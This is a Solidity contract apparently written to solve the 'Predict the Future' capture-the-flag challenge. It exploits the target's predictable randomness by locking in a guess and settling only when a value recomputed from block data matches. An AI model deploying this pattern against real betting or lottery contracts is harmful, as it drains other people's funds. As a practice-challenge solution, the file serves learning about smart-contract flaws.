/**
 *Submitted for verification at Etherscan.io on 2022-07-20
*/

pragma solidity ^0.4.21;

interface IPredictTheFutureChallenge {
    function isComplete() public view returns (bool);
    function lockInGuess(uint8 n) public payable;
    function settle() public;
}

contract CTFPredictTheFuture {
    uint8 public preGuess = 0;
    address public challengeContractAddress;

    function CTFPredictTheFuture() public {
        
    }

    function setAddress(address _address) public {
        challengeContractAddress = _address;
    }

    function preLockInGuess() public payable{
        require(msg.value == 1 ether);
        require(preGuess == 0);

        preGuess = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        IPredictTheFutureChallenge challengeInstance = IPredictTheFutureChallenge(challengeContractAddress);
        challengeInstance.lockInGuess.gas(1000000).value(msg.value)(preGuess);
    }

    function guess() public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        if(answer == preGuess) {
            IPredictTheFutureChallenge challengeInstance = IPredictTheFutureChallenge(challengeContractAddress);
            challengeInstance.settle();
        }
    }

    function hasComplete() public view returns(bool) {
        IPredictTheFutureChallenge challengeInstance = IPredictTheFutureChallenge(challengeContractAddress);
        return challengeInstance.isComplete();
    }
}